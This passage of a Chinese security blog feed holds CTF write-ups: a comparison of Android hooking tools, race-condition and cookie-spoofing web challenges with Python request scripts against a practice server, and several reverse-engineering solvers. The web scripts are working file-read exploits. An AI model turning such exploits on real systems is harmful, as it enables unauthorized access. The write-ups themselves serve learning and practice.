    <content type="html"><![CDATA[<h3 id="Android三大框架对比"><a href="#Android三大框架对比" class="headerlink" title="Android三大框架对比"></a>Android三大框架对比</h3><h4 id="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："><a href="#Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：" class="headerlink" title="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："></a>Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：</h4><h6 id="Xposed的优缺点"><a href="#Xposed的优缺点" class="headerlink" title="Xposed的优缺点"></a>Xposed的优缺点</h6><blockquote><p>优点：在编写Java层hook插件的时候非常好用，这一点完全优越于Frida和SubstrateCydia，因为他也是Android项目，可以直接编写Java代码调用各类api进行操作。而且可以安装到手机上直接使用。</p></blockquote><blockquote><p>缺点：配置安装环境繁琐，兼容性差，在Hook底层的时候就很无助了。</p></blockquote><h5 id="Frida的优缺点"><a href="#Frida的优缺点" class="headerlink" title="Frida的优缺点"></a>Frida的优缺点</h5><blockquote><p>优点：在上面我们可以看到他的优点在于配置环境很简单，操作也很便捷，对于破解者开发阶段非常好用。支持Java层和Native层hook操作，在Native层hook如果是非基本类型的话操作有点麻烦。</p></blockquote><blockquote><p>缺点：因为他只适用于破解者在开发阶段，也就是他没法像Xposed用于实践生产中，比如我写一个微信外挂用Frida写肯定不行的，因为他无法在手机端运行。也就是破解者用的比较多。</p></blockquote><h5 id="SubstrateCydia的优缺点"><a href="#SubstrateCydia的优缺点" class="headerlink" title="SubstrateCydia的优缺点"></a>SubstrateCydia的优缺点</h5><blockquote><p>优点：可以运行在手机端，和Xposed类似可以用于实践生产中。支持Java层和Native层的hook操作，但是Java层hook不怎么常用，用的比较多的是Native层hook操作，因为他也是Android工程可以引用系统api，操作更为方便</p></blockquote><blockquote><p>缺点：和Xposed一样安装配置环境繁琐，兼容性差。</p></blockquote><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>以上这三个工具可以说是现在用的最多的hook工具了，总结一句话就是写Java层Hook还是Xposed方便，写Native层Hook还是Cydia了，而对于破解者开发那还是Frida最靠谱了。写外挂最难的也是最重要的不是<br>写代码而是寻找hook点，也就是逆向分析app找到那个地方，然后写hook代码实现插件功能。</p></blockquote><h3 id="frida-install"><a href="#frida-install" class="headerlink" title="frida install"></a>frida install</h3><pre><code class="bash">pip install frida-tools下载frida-serverhttps://github.com/frida/frida/releases</code></pre><h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><blockquote><p>在terminal中运行cat命令</p></blockquote><p><img src="/images/pasted-126.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>新开terminal，运行以下代码</p></blockquote><pre><code class="python">import fridadef on_message(message, data):    print(&quot;[on_message] message:&quot;, message, &quot;data:&quot;, data)session = frida.attach(&quot;cat&quot;)script = session.create_script(&quot;&quot;&quot;rpc.exports.enumerateModules = function () {  return Process.enumerateModules();};&quot;&quot;&quot;)script.on(&quot;message&quot;, on_message)script.load()print([m[&quot;name&quot;] for m in script.exports.enumerate_modules()])</code></pre><blockquote><p>输出类似如下信息,即说明安装成功</p></blockquote><pre><code class="bash">[u&#39;cat&#39;, u&#39;libSystem.B.dylib&#39;, u&#39;libcache.dylib&#39;, u&#39;libcommonCrypto.dylib&#39;, u&#39;libcompiler_rt.dylib&#39;, u&#39;libcopyfile.dylib&#39;, u&#39;libcorecrypto.dylib&#39;, u&#39;libdispatch.dylib&#39;, u&#39;libdyld.dylib&#39;, u&#39;libkeymgr.dylib&#39;, u&#39;liblaunch.dylib&#39;, u&#39;libmacho.dylib&#39;, u&#39;libquarantine.dylib&#39;, u&#39;libremovefile.dylib&#39;, u&#39;libsystem_asl.dylib&#39;, u&#39;libsystem_blocks.dylib&#39;, u&#39;libsystem_c.dylib&#39;, u&#39;libsystem_configuration.dylib&#39;, u&#39;libsystem_coreservices.dylib&#39;, u&#39;libsystem_darwin.dylib&#39;, u&#39;libsystem_dnssd.dylib&#39;, u&#39;libsystem_info.dylib&#39;, u&#39;libsystem_m.dylib&#39;, u&#39;libsystem_malloc.dylib&#39;, u&#39;libsystem_networkextension.dylib&#39;, u&#39;libsystem_notify.dylib&#39;, u&#39;libsystem_sandbox.dylib&#39;, u&#39;libsystem_secinit.dylib&#39;, u&#39;libsystem_kernel.dylib&#39;, u&#39;libsystem_platform.dylib&#39;, u&#39;libsystem_pthread.dylib&#39;, u&#39;libsystem_symptoms.dylib&#39;, u&#39;libsystem_trace.dylib&#39;, u&#39;libunwind.dylib&#39;, u&#39;libxpc.dylib&#39;, u&#39;libobjc.A.dylib&#39;, u&#39;libc++abi.dylib&#39;, u&#39;libc++.1.dylib&#39;, u&#39;dyld&#39;]</code></pre><h3 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h3><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a></p><p><a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">https://www.frida.re/docs/home/</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>android hook</tag>
      
      <tag>android frida</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次简单的条件竞争的题目</title>
    <link href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html"/>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手</p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/images/pasted-116.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>我们可以控制文件的名字和文件的内容</p></blockquote><p><img src="/images/pasted-117.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-118.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>但是当我们访问的时候去发现访问不到，猜想应该是被删了，这就要利用条件竞争这个漏洞了</p></blockquote><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>创建一个多线程程序不断的向服务器发起请求创建一个文件，在创建一个程序循环读取这个文件</p></blockquote><blockquote><p>这里使用burp suite进行申请创建文件，写一个死循环读取这个文件</p></blockquote><p><img src="/images/pasted-119.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-120.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>在start attack之前需要先运行访问的脚本</p></blockquote><p><img src="/images/pasted-124.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-122.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-123.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-125.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以得到内容，这题旨在能够访问到这个文件就能拿到flag</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0RTAwJXU0RTBCJXU1NDYy</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cookie欺骗 writeup</title>
    <link href="/cookie%E6%AC%BA%E9%AA%97-writeup.html"/>
    <url>/cookie%E6%AC%BA%E9%AA%97-writeup.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Begin</p></blockquote><p><img src="/images/pasted-113.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>发现filename为keys.txt的base64加密，试着读取index.php文件</p></blockquote><p><img src="/images/pasted-114.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>发现能读到东西了，接下来读取整个文件</p></blockquote><pre><code class="python">from requests import *from base64 import *for i in range(0,20):    url = &quot;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&quot;%i    respone = get(url=url)    print respone.text</code></pre><pre><code class="php">&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(    &#39;0&#39; =&gt;&#39;keys.txt&#39;,    &#39;1&#39; =&gt;&#39;index.php&#39;,);if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;){    $file_list[2]=&#39;keys.php&#39;;}if(in_array($file, $file_list)){    $fa = file($file);    echo $fa[$line];}?&gt;</code></pre><blockquote><p>逻辑不难，要求我们将cookie设置成margin=margin，然后在用相同的办法读取keys.php</p></blockquote><pre><code class="python">from requests import *from base64 import *for i in range(0,20):    url = &quot;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=%s&quot;%(i,b64encode(&quot;keys.php&quot;))    header = {        &quot;Cookie&quot;: &quot;margin=margin&quot;    }    res = get(url=url,headers=header)    print res.text</code></pre><pre><code class="php">&lt;?php $key=&#39;KEY{key_keys}&#39;; ?&gt;</code></pre><blockquote><p>得到flag：KEY{key_keys}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jactf-reverse3</title>
    <link href="/%E6%8E%98%E5%AE%89RE_crypto.html"/>
    <url>/%E6%8E%98%E5%AE%89RE_crypto.html</url>
    
    <content type="html"><![CDATA[<h3 id="RE-crypto"><a href="#RE-crypto" class="headerlink" title="RE_crypto"></a>RE_crypto</h3><p><img src="/images/pasted-109.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-110.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-111.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>程序逻辑不难，输入的字符作为unk_4021A0数组的下标，定位该下标所对应的值，与((v11 + v12) ^ 0x19)比较，这个值是可以自己算出来的</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">byte1=[0x32,0x61,0x34,0x39,0x66,0x36,0x39,0x63,0x33,0x38,0x33,0x39,0x35,0x63,0x64,0x65,0x39,0x36,0x64,0x36,0x64,0x65,0x39,0x36,0x64,0x36,0x66,0x34,0x65,0x30,0x32,0x35,0x34,0x38,0x34,0x39,0x35,0x34,0x64,0x36,0x31,0x39,0x35,0x34,0x34,0x38,0x64,0x65,0x66,0x36,0x65,0x32,0x64,0x61,0x64,0x36,0x37,0x37,0x38,0x36,0x65,0x32,0x31,0x64,0x35,0x61,0x64,0x61,0x65,0x36]byte = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]ans = &quot;&quot;for i in range(0,len(byte1),2):    v9 = 0    v10 = 0    if byte1[i] &lt; 48 or byte1[i] &gt; 57:        v9 = byte1[i] - 87    else:        v9 = byte1[i] - 48    if byte1[i+1] &lt; 48 or byte1[i+1] &gt; 57:        v10 = byte1[i+1] - 87    else:        v10 = byte1[i+1] - 48    flag = (16*v9+v10) ^ 0x19    for j in range(0,len(byte)):        if flag == byte[j]:            ans += chr(j)print ans</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>看了encrypt，只理解了一小部分，后面的部分实在不太明白到底是干嘛，还是太菜了，近几天做的逆向题目，让我深刻认识到密码学、算法(acm)在逆向中的重要地位，一步一个jio印吧……</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>jactf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次控制流平坦化逆向</title>
    <link href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E9%80%86%E5%90%91.html"/>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E9%80%86%E5%90%91.html</url>
    
    <content type="html"><![CDATA[<h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p><img src="/images/pasted-97.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>是控制流平坦化的题目</p></blockquote><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p><img src="/images/pasted-98.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>可以分析出函数的5个主要函数</p></blockquote><p><img src="/images/pasted-99.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>fun_check1(char *a1) 主要作用是检查输入字符串长度</p></blockquote><p><img src="/images/pasted-100.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>fun_check1(char *a1) 主要作用是检查输入前五个字节是否为flag{</p></blockquote><p><img src="/images/pasted-101.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>fun_check3(char *a1) 主要作用是检查输入的最后一个字节是否为}</p></blockquote><p><img src="/images/pasted-102.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>fun_check4(char *a1) 主要作用是检查输入的几个特殊部位的值是否为—</p></blockquote><p><img src="/images/pasted-103.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-104.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-105.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入的字符串进行加密后与字符串进行比较</p></blockquote><p><img src="/images/pasted-106.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>这就是比较的那个字符串 J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB</p></blockquote><blockquote><p>循环判断输入的每一位是否小于’0’或者大于’9’，如果满足条件，就判断是否等于’-‘，如果等于这个位置的字符就不变，如果大于’a’并且小于’z’，这个位置的字符串就减去48，其余的所有情况都进行将本位置的字符加上17</p></blockquote><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python">flag = &quot;J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB&quot;print len(flag)strs = &quot;&quot;for i in range(0,len(flag)):    for j in range(0,255):        temp = &quot;&quot;        if j &lt; ord(&quot;0&quot;) or j &gt; ord(&quot;9&quot;):            if j == ord(&quot;-&quot;):                temp = chr(j)            elif j &gt;= ord(&#39;a&#39;) and j &lt;= ord(&quot;z&quot;):                temp = chr(j-48)        else:            temp = chr(j+17)        if temp == flag[i]:            strs += chr(j)            breakprint strs</code></pre>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>flat</tag>
      
      <tag>ollvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次简单的VM程序逆向</title>
    <link href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84VM%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91.html"/>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84VM%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91.html</url>
    
    <content type="html"><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a href="http://malwaretech.com/downloads/vm1.zip" target="_blank" rel="noopener">vm crackme</a></p><p><img src="/images/pasted-91.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>程序给了三个文件，主要是要求我们通过分析vm1.exe文件的虚拟机，然后自己实现虚拟机，执行ram.bin中的opcode</p></blockquote><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/images/pasted-93.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>程序先申请一个堆，然后将unk_404040copy到Dst中，进而执行sub_4022e0_</p></blockquote><p><img src="/images/pasted-94.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>依次取出Dst中的数据，然后调用sub_402270，可知255之后的数据是opcode，255之前的数据是data</p></blockquote><p><img src="/images/pasted-95.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>这就是opcode执行的主要函数</p></blockquote><h3 id="实现自己的虚拟机"><a href="#实现自己的虚拟机" class="headerlink" title="实现自己的虚拟机"></a>实现自己的虚拟机</h3><pre><code class="python">f = open(&quot;./ram.bin&quot;,&quot;rb&quot;)opcode = list(f.read())data = opcode[:0xff]for i in range(0,len(data)):    data[i] = ord(opcode[i])def sub_402270(v0,v1,v2):    global byte    if v0 == 1:        data[v1] = v2;        print &quot;mov data[%d], 0x%x&quot;%(v1,v2)    elif v0 == 2:        byte = data[v1]        print &quot;mov rax, data[%d]&quot;%v1    elif v0 == 3:        data[v1] = data[v1] ^ byte        print &quot;xor data[%d], rax&quot;%v1for i in range(0,len(opcode)-257,3):    v0 = opcode[255+i]    v1 = opcode[256+i]    v2 = opcode[257+i]    if v0 == 4:        break    sub_402270(ord(v0),ord(v1),ord(v2))print &#39;&#39;.join(chr(i) for i in data)</code></pre><h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><pre><code class="bash">mov data[29], 0xbdmov data[5], 0x53mov data[18], 0x48mov data[16], 0xe6mov data[19], 0x8amov data[13], 0x47mov data[22], 0x13mov data[10], 0x15mov data[0], 0x98mov data[2], 0x3cmov data[24], 0xd9mov data[26], 0x57mov data[6], 0xabmov data[27], 0xc6mov data[1], 0x32mov data[23], 0x20mov data[21], 0x6fmov data[17], 0x2dmov data[8], 0xc9mov data[9], 0xe7mov data[3], 0x12mov data[12], 0x2fmov data[14], 0x88mov data[25], 0x6cmov data[4], 0x65mov data[30], 0xaemov data[20], 0x59mov data[31], 0x91mov data[28], 0x5dmov data[15], 0xaemov data[11], 0x15mov data[7], 0xccmov rax, data[32]xor data[0], raxmov rax, data[33]xor data[1], raxmov rax, data[34]xor data[2], raxmov rax, data[35]xor data[3], raxmov rax, data[36]xor data[4], raxmov rax, data[37]xor data[5], raxmov rax, data[38]xor data[6], raxmov rax, data[39]xor data[7], raxmov rax, data[40]xor data[8], raxmov rax, data[41]xor data[9], raxmov rax, data[42]xor data[10], raxmov rax, data[43]xor data[11], raxmov rax, data[44]xor data[12], raxmov rax, data[45]xor data[13], raxmov rax, data[46]xor data[14], raxmov rax, data[47]xor data[15], raxmov rax, data[48]xor data[16], raxmov rax, data[49]xor data[17], raxmov rax, data[50]xor data[18], raxmov rax, data[51]xor data[19], raxmov rax, data[52]xor data[20], raxmov rax, data[53]xor data[21], raxmov rax, data[54]xor data[22], raxmov rax, data[55]xor data[23], raxmov rax, data[56]xor data[24], raxmov data[25], 0x0FLAG{VMS-ARE-FOR-MALWARE}W�]����~}U��GP���`    �.Ae�</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p> 第一次逆向vm程序，初次体验了被vm虐哭的感觉</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>vm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>so库移植</title>
    <link href="/so%E5%BA%93%E7%A7%BB%E6%A4%8D.html"/>
    <url>/so%E5%BA%93%E7%A7%BB%E6%A4%8D.html</url>
    
    <content type="html"><![CDATA[<h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><blockquote><p>攻防世界 pingpong</p></blockquote><h3 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h3><pre><code class="java">package com.geekerchina.pingpongmachine;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity {    OnClickListener jping = new OnClickListener() {        public void onClick(View v) {            if (MainActivity.this.tt % 2 == 1) {                MainActivity.this.p = 0;                MainActivity.this.num = 0;                MainActivity.this.tt = MainActivity.this.ttt;            }            MainActivity.this.tt--;            MainActivity.this.p = MainActivity.this.ping(MainActivity.this.p, MainActivity.this.num);            MainActivity.this.num++;            if (MainActivity.this.num &gt;= 7) {                MainActivity.this.num = 0;            }            TextView t = (TextView) MainActivity.this.findViewById(R.id.out);            t.setText(&quot;PING&quot;);            if (MainActivity.this.tt == 0) {                t.setText(&quot;FLAG: BCTF{MagicNum&quot; + Integer.toString(MainActivity.this.p) + &quot;}&quot;);            }        }    };    OnClickListener jpong = new OnClickListener() {        public void onClick(View v) {            if (MainActivity.this.tt % 2 == 0) {                MainActivity.this.p = 0;                MainActivity.this.num = 0;                MainActivity.this.tt = MainActivity.this.ttt;            }            MainActivity.this.tt--;            MainActivity.this.p = MainActivity.this.pong(MainActivity.this.p, MainActivity.this.num);            MainActivity.this.num++;            if (MainActivity.this.num &gt;= 7) {                MainActivity.this.num = 0;            }            TextView t = (TextView) MainActivity.this.findViewById(R.id.out);            t.setText(&quot;PONG&quot;);            if (MainActivity.this.tt == 0) {                t.setText(&quot;FLAG: BCTF{MagicNum&quot; + Integer.toString(MainActivity.this.p) + &quot;}&quot;);            }        }    };    public int num = 0;    public int p = 0;    public int tt = this.ttt;    public int ttt = 1000000;    public native int ping(int i, int i2);    public native int pong(int i, int i2);    /* access modifiers changed from: protected */    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(this.jping);        ((Button) findViewById(R.id.button2)).setOnClickListener(this.jpong);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem item) {        if (item.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }    static {        System.loadLibrary(&quot;pp&quot;);    }}</code></pre><blockquote><p>这是主要逻辑<br>需要循环点击ping pong按钮，直到出现flag<br>ping pong函数属于native层的函数</p></blockquote><p><img src="/images/pasted-84.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-85.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>so库的两个主要函数，都是经过了混淆，这里可以利用so库移植到别的程序上，通过程序来实现点击按钮的效果，而ping pong函数每次执行都会沉睡1s，1000000s的时间后就会得到flag了，所以我们需要修改so库的sleep函数</p></blockquote><p><img src="/images/pasted-86.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>另一个函数同理</p></blockquote><h3 id="编写app"><a href="#编写app" class="headerlink" title="编写app"></a>编写app</h3><ol><li>创建一个与源程序名称相同的app</li></ol><p><img src="/images/pasted-87.png" srcset="/img/loading.gif" alt="upload successful"></p><ol start="2"><li>将程序中的so库移动到新建的app的libs目录下</li></ol><p><img src="/images/pasted-88.png" srcset="/img/loading.gif" alt="upload successful"></p><ol start="3"><li>修改build.gradle<blockquote><p>添加一下代码</p></blockquote></li></ol><pre><code class="java">task nativeLibsToJar(type: Zip, description: &quot;create a jar archive of the native libs&quot;) {    destinationDir file(&quot;$projectDir/libs&quot;)    baseName &quot;Native_Libs2&quot;    extension &quot;jar&quot;    from fileTree(dir: &quot;libs&quot;, include: &quot;**/*.so&quot;)    into &quot;lib&quot;}tasks.withType(JavaCompile) {    compileTask -&gt; compileTask.dependsOn(nativeLibsToJar)}</code></pre><ol start="4"><li>修改MainActivity代码</li></ol><pre><code class="java">package com.geekerchina.pingpongmachine;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity {    private static final String TAG = &quot;MainActivity&quot;;    static {        System.loadLibrary(&quot;pp&quot;);    }    public native int ping(int i, int i2);    public native int pong(int i, int i2);    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        int ttt = 1000000;        int num = 0;        int tt = ttt;        int p = 0;        while(true){            if (tt % 2 == 1) {                tt--;                p = pong(p, num);                num++;                if (num &gt;= 7) {                    num = 0;                }                if (tt == 0) {                    Log.d(TAG, &quot;BCTF{MagicNum&quot; + Integer.toString(p) + &quot;}&quot;);                    break;                }            }            else{                tt--;                p = ping(p, num);                num++;                if (num &gt;= 7) {                    num = 0;                }                if (tt == 0) {                    Log.d(TAG, &quot;BCTF{MagicNum&quot; + Integer.toString(p) + &quot;}&quot;);                    break;                }            }        }    }}</code></pre><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/images/pasted-89.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>so库移植使用起来，真是能够减少对so层代码的研究，节省时间</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/</a><br><a href="https://blog.csdn.net/JasaLee/article/details/70242837" target="_blank" rel="noopener">https://blog.csdn.net/JasaLee/article/details/70242837</a></p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attackworld-gametime</title>
    <link href="/attackworld-gametime.html"/>
    <url>/attackworld-gametime.html</url>
    
